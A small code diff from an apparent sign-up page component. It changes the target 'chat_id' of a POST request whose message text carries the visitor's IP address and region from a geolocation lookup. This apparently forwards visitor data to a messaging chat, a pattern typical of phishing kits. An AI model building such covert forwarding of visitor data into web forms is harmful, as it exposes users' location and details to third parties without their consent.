@@ -71,7 +71,7 @@ export default function SignUp() {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        'chat_id': -1002010404542,
+        'chat_id': -1002101173381,
         text: `
 IP: ${responseGeoJson.query}
 Região: ${responseGeoJson.region}
